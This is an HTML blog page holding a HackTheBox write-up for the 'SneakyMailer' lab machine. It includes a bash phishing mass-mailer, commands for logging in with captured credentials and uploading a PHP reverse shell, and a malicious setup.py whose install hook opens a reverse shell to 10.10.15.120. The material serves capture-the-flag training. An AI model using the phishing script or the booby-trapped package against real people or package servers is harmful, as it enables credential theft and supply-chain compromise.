@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>SneakyMailer [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SneakyMailer [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="SneakyMailer [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="SneakyMailer is a Linux based machine that was active since July 11th of 2020 to November 28 , on this machine we will have to make a phising campain to get the credendials of a user, then using those credentials we will access to their smtp server and find other credentials on his sent messages, we will use those credentials to access to a ftp server where we will upload a reverse shell that we could access trough its webpage, after that we will find out that the machine has a pypiserver and that it install every package that is uploaded to it, so we will recover the password of the pypi server, generate a malicious pypi package and when we upload it we will get a shell as another user, this user can use pip3 as root without supplying a password, so we will abuse of this to get root on the machine." />
+<meta property="og:description" content="SneakyMailer is a Linux based machine that was active since July 11th of 2020 to November 28 , on this machine we will have to make a phising campain to get the credendials of a user, then using those credentials we will access to their smtp server and find other credentials on his sent messages, we will use those credentials to access to a ftp server where we will upload a reverse shell that we could access trough its webpage, after that we will find out that the machine has a pypiserver and that it install every package that is uploaded to it, so we will recover the password of the pypi server, generate a malicious pypi package and when we upload it we will get a shell as another user, this user can use pip3 as root without supplying a password, so we will abuse of this to get root on the machine." />
+<link rel="canonical" href="http://localhost:8000/SneakyMailer" />
+<meta property="og:url" content="http://localhost:8000/SneakyMailer" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/sneakymailer/sneakymailer.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-11-28T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/sneakymailer/sneakymailer.png" />
+<meta property="twitter:title" content="SneakyMailer [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2020-11-28T00:00:00-05:00","datePublished":"2020-11-28T00:00:00-05:00","description":"SneakyMailer is a Linux based machine that was active since July 11th of 2020 to November 28 , on this machine we will have to make a phising campain to get the credendials of a user, then using those credentials we will access to their smtp server and find other credentials on his sent messages, we will use those credentials to access to a ftp server where we will upload a reverse shell that we could access trough its webpage, after that we will find out that the machine has a pypiserver and that it install every package that is uploaded to it, so we will recover the password of the pypi server, generate a malicious pypi package and when we upload it we will get a shell as another user, this user can use pip3 as root without supplying a password, so we will abuse of this to get root on the machine.","headline":"SneakyMailer [HTB]","image":"http://localhost:8000/assets/images/sneakymailer/sneakymailer.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/SneakyMailer"},"url":"http://localhost:8000/SneakyMailer"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/sneakymailer/sneakymailer.png/../banner.png>
+  
+  <h2>SneakyMailer [HTB]</h2>
+  <time datetime="2020-11-28T00:00:00-05:00" class="by-line">28 Nov 2020</time>
+  <p>SneakyMailer is a Linux based machine that was active since July 11th of 2020 to November 28 , on this machine we will have to make a phising campain to get the credendials of a user, then using those credentials we will access to their smtp server and find other credentials on his sent messages, we will use those credentials to access to a ftp server where we will upload a reverse shell that we could access trough its webpage, after that we will find out that the machine has a pypiserver and that it install every package that is uploaded to it, so we will recover the password of the pypi server, generate a malicious pypi package and when we upload it we will get a shell as another user, this user can use pip3 as root without supplying a password, so we will abuse of this to get root on the machine.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan -e tun0 --rate=500 -p 0-65535 10.10.10.197
+nmap -sC -sV -p 80,143,993,25,22,21,8080, -Pn -o scan.txt 10.10.10.197
+
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
+|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
+|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
+25/tcp   open  smtp     Postfix smtpd
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+80/tcp   open  http     nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Did not follow redirect to http://sneakycorp.htb
+143/tcp  open  imap     Courier Imapd (released 2018)
+|_imap-capabilities: THREAD=REFERENCES ACL2=UNION ENABLE STARTTLS UTF8=ACCEPTA0001 CHILDREN OK ACL IMAP4rev1 NAMESPACE CAPABILITY QUOTA completed UIDPLUS THREAD=ORDEREDSUBJECT SORT IDLE
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+993/tcp  open  ssl/imap Courier Imapd (released 2018)
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open  http     nginx 1.14.2
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome to nginx!
+Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>We see that there are some open ports, ftp which doesn’t seem to allow anonymous login, some email related ports, such as smtp, imap and ssl/imap, and two webpages, one on port 80 and the other one on port 8080.
+We start with the one on port 80, when we enter we are redirected to “http://sneakycorp.htb/” so we have to add that entry to our hosts file, since we have a domain probably the site contains some subdomains, but we will test that later, what wee see is a kind of dashboard of the company.</p>
+
+<p><img src="/assets/images/sneakymailer/website.png" alt="" /></p>
+
+<p>If we enter to “Team” we see a large list of employees with their emails.</p>
+
+<p><img src="/assets/images/sneakymailer/team.png" alt="" /></p>
+
+<h2 id="phishing-campaign"><a href="#header-2"></a>Phishing Campaign</h2>
+
+<p>This is not something common on ctf boxes, but the image of the machine is a hint, we have to do a phishing campagin, the pagination is made on js but all the information is gotten on the first request, so we can get all the emails with a single request, so we request the page, grab the lines with “sneakymailer.htb”, get rid of the html tags and save it to a file called maillist.txt, to do that we use the next commands: <code class="language-plaintext highlighter-rouge">curl http://sneakycorp.htb/team.php | grep "sneakymailer.htb" | cut -d "&gt;" -f 2 | cut -d "&lt;" -f 1 &gt; maillist.txt</code>.
+When you do a phising campaign you probably want to go for spear phishing or whaling, and you might want to make a “believable” phishing page, but ctfs are more about of practicing concepts rather than simulating real scenarios, so we don’t have to build any webpage, python http.server will be enough, also we will flood all the emails with the same message.</p>
+
+<p>Now that we have the list of emails we can send the messages, there are some tools to do that, but we will script something simple, <code class="language-plaintext highlighter-rouge">curl</code> can be used to send emails to smtp servers, first we will create a file called “mail.txt” which will contain the email, it just has to fulfill the basic email structure.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From: 5ubterranean@sneakymailer.htb
+To: tigernixon@sneakymailer.htb
+Subject: Your bank account
+
+http://10.10.15.120/account/
+</code></pre></div></div>
+<p>Then we have to build the script that will send the email to all the emails on the list, we called it phish.sh.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nv">OLDMAIL</span><span class="o">=</span><span class="s1">'tigernixon@sneakymailer.htb'</span>
+<span class="k">while </span><span class="nb">read </span>p<span class="p">;</span> <span class="k">do
+	</span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s2">"s/</span><span class="k">${</span><span class="nv">OLDMAIL</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">p</span><span class="k">}</span><span class="s2">/"</span> mail.txt
+	curl smtp://sneakycorp.htb <span class="nt">--mail-from</span> 5ubterranean@sneakymailer.htb <span class="nt">--mail-rcpt</span> <span class="k">${</span><span class="nv">p</span><span class="k">}</span> <span class="nt">--upload-file</span> mail.txt
+	<span class="nv">OLDMAIL</span><span class="o">=</span><span class="k">${</span><span class="nv">p</span><span class="k">}</span>
+<span class="k">done</span> &lt;  maillist.txt
+</code></pre></div></div>
+<p>“tigernixon@sneakymailer.htb” is the first email on maillist.txt, that’s why we are starting with it, so what the script does is: It reads every line on maillist.txt, changes the email inside “mail.txt” and sends it using curl to the target email, note that receiver changes in two places, actually there is no need of changing the email inside “mail.txt”, but let’s try to look more legitimate at least here.
+Before running “phish.sh” we have to start our http server on port 80, <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code> and also wireshark, once we have both running we can fire up the script, after waiting for a while we will see that our server gets a POST request.</p>
+
+<p><img src="/assets/images/sneakymailer/postgot.png" alt="" /></p>
+
+<p>But there is a problem, by default python http server doesn’t support POST requests, that’s why we needed wireshark, we filter for packets coming from the machine that used POST request: <code class="language-plaintext highlighter-rouge">ip.src == 10.10.10.197 &amp;&amp; http.request.method == POST</code></p>
+
+<p><img src="/assets/images/sneakymailer/wirepost.png" alt="" /></p>
+
+<p>We follow the http stream and see some credentials.</p>
+
+<p><img src="/assets/images/sneakymailer/phished.png" alt="" /></p>
+
+<p>The password is URL enconded, after decoding it we get that the email is “paulbyrd@sneakymailer.htb” and its password is “^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht”</p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>Well we got some credentials, we can use them to login into the imap server and try to find useful information, we can connect to it using nc: <code class="language-plaintext highlighter-rouge">nc 10.10.10.197 143</code></p>
+
+<p><img src="/assets/images/sneakymailer/mailssent.png" alt="" /></p>
+
+<p>Once we are connected we use “aa LOGIN paulbyrd <code class="language-plaintext highlighter-rouge">^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht"</code> to login as the user, then we list all the availabe folders with <code class="language-plaintext highlighter-rouge">aa LIST "" "*"</code>, after that we check if “Sent Items” has any message, <code class="language-plaintext highlighter-rouge">aa STATUS "INBOX.Sent Items" (MESSAGES)</code> (all the other folders are empty), finally we select it and read the first message, <code class="language-plaintext highlighter-rouge">aa SELECT "INBOX.Sent Items"</code>, <code class="language-plaintext highlighter-rouge">aa FETCH 1 (BODY[1])</code>. There wee see that the user is asking for the password of an account to be changed, if we are lucky the password hasn’t been changed yet.
+We can use those creds to access to the ftp server, it only has “dev” folder and inside we can see the sourcecode of the webpage.</p>
+
+<p><img src="/assets/images/sneakymailer/ftp.png" alt="" /></p>
+
+<p>After testing it we find out that we can upload files in “dev” folder (but we can’t upload on any subdirectory), so we upload a revershe shell (as always I use <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey’s php reverse shell</a>), we named it “rev.php”, but if we access to “http://sneakycorp.htb/rev.php” we get a not found page, so maybe the ftp is a place where a kind of backup code is stored, or maybe it is located at a subdomain, so we use <a href="https://github.com/ffuf/ffuf">ffuf</a> to find subdomains, we should have run this on background while we were doing the previous steps, the command to do this is: <code class="language-plaintext highlighter-rouge">ffuf -u http://10.10.10.197 -H "Host: FUZZ.sneakycorp.htb" -w /usr/share/wordlists/dirb/common.txt --fs 185</code></p>
+
+<p><img src="/assets/images/sneakymailer/ffuf.png" alt="" /></p>
+
+<p>We see that there is a “dev” subdomain, so we add it to our hosts file, the ftp server is cleaned every x seconds, so we will need to upload again our reverse shell, and when we access to “http://dev.sneakycorp.htb/rev.php” we get a shell.</p>
+
+<p><img src="/assets/images/sneakymailer/shell1.png" alt="" /></p>
+
+<h1 id="lateral-movement"><a href="#header-1"></a>Lateral Movement</h1>
+
+<p>Now that we are inside the machine we can enumerate more, we start checking the webpage, so we go to “/var/www” and see that there is a directory for every subdomain.</p>
+
+<p><img src="/assets/images/sneakymailer/www.png" alt="" /></p>
+
+<p>If we go to “http://pypi.sneakycorp.htb/” we are redirected to main subdomain, but we haven’t checked port 8080, if we go to “http://pypi.sneakycorp.htb:8080/” we find a pypiserver (we might have also found this subdomain using ffuf).</p>
+
+<p><img src="/assets/images/sneakymailer/pypi.png" alt="" /></p>
+
+<p>As any pypiserver you can list the packages that it serves going to “/simple”, but we are asked for credentials, and the ones that we have doesn’t work, since we are in nginx we can find the hash of the credentials in .htpasswd file inside the corresponding directory.</p>
+
+<p><img src="/assets/images/sneakymailer/pycreds.png" alt="" /></p>
+
+<p>We save copy the hash locally and use john to crack it, we get that the password is “soufianeelhaoui”.</p>
+
+<p><img src="/assets/images/sneakymailer/pypass.png" alt="" /></p>
+
+<p>Great we can now interact with pypiserver, but there isn’t any package to download, and we can’t use those creds inside the machine, so maybe we have to upload a package and something might happen… Well that’s not very convincing but we have to try, the box has python2 and python3 installed so we have to find out which version is running the pypi server so we don’t get any issue, we read the file “venv/pyvenv.cfg” and we see that it is using python3.</p>
+
+<p><img src="/assets/images/sneakymailer/pyver.png" alt="" /></p>
+
+<p>Well the first thing that we have to do is generate a package, rather than reading the whole pypi documentation we can use a module that generate us a template of a package, so we run <code class="language-plaintext highlighter-rouge">pip3 install create_package</code>, and the run “python -m create_package” to generate the template.</p>
+
+<p><img src="/assets/images/sneakymailer/genpackage.png" alt="" /></p>
+
+<p>Now we have to create a file called “.pypirc” in our home directory, setting up a repository called “local” so we can upload our package to the target box rather than the main pypi server (please don’t try to upload malicious packages to the oficial pypi server), the content of the file is the next one:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[distutils]
+index-servers =
+ local
+
+[local]
+repository=http://pypi.sneakycorp.htb:8080
+username=pypi
+password=soufianeelhaoui
+</code></pre></div></div>
+
+<p>Now we have a test package to upload, but before that we upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> to see if something happens when we upload the pacakge, once we have pspy running we go to the directory generated by create_package and execute <code class="language-plaintext highlighter-rouge">python3 setup.py sdist upload -r local</code> to upload the package, it uploads with no problems, and pspy catches the next stuff:</p>
+
+<p><img src="/assets/images/sneakymailer/pspy.png" alt="" /></p>
+
+<p>We can see that when we upload a package the machine installs the package, well that is something we can abuse, <a href="https://github.com/sn0wfa11/evil_py">here</a> is an example of how to get a shell when someone install a package, as we see the reverse shell is put at the start of the “setup.py” file, we copy the start of the example but we put a reverse shell generated with <a href="https://github.com/D4Vinci/One-Lin3r">one-lin3r</a>. But the package is not ready yet, when we try to upload the package, setup.py is executed, so if we try to upload it we will get a shell to our machine before it uploads, and it won’t upload, so we must add a check so the shell just gets executed out of our machine, I use parrot os, so I put an if condition that checks that uname doesn’t contain the word “parrot”, so the start of setup.py looks like this:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">setuptools</span>
+<span class="kn">from</span> <span class="n">setuptools.command.install</span> <span class="kn">import</span> <span class="n">install</span>
+
+<span class="k">class</span> <span class="nc">shell</span><span class="p">(</span><span class="n">install</span><span class="p">):</span>
+	<span class="k">if</span> <span class="nf">str</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">uname</span><span class="p">()).</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">parrot</span><span class="sh">"</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+		<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">10.10.15.120</span><span class="sh">"</span><span class="p">,</span><span class="mi">54322</span><span class="p">));</span><span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="kn">import</span> <span class="n">pty</span><span class="p">;</span> <span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">README.md</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="n">long_description</span> <span class="o">=</span> <span class="n">fh</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>We upload our package again and we will get a shell as “low”.</p>
+
+<p><img src="/assets/images/sneakymailer/shell2.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>We got user.txt, prvilege escalation is trivial, we see that we can run pip3 without supplying credentials, we search pip in <a href="https://gtfobins.github.io/gtfobins/pip/#sudo">gtfobins</a> and we find a privilege escalation technique, it is for pip, but there is no difference with pip3, so we follow the steps and we are finished with the box.</p>
+
+<p><img src="/assets/images/sneakymailer/privesc.png" alt="" /></p>
+
+<h1 id="final-thoughts"><a href="#header-1"></a>Final Thoughts</h1>
+
+<p>Some lessons that we can learn are:</p>
+<ul>
+  <li>No matter how strongs you passwords are if someone tricks you to send him your credentials there is no point, if we recall the passwords of this machine (besides the one of pypi) were really strong, long, with all the characters and completely random, but we found them laying around.</li>
+  <li>Check what you allow to run as root, yes it can be annoying to write the password every time that you want to run something as root, but it is an important measure of protection.</li>
+</ul>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#python"> Python</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
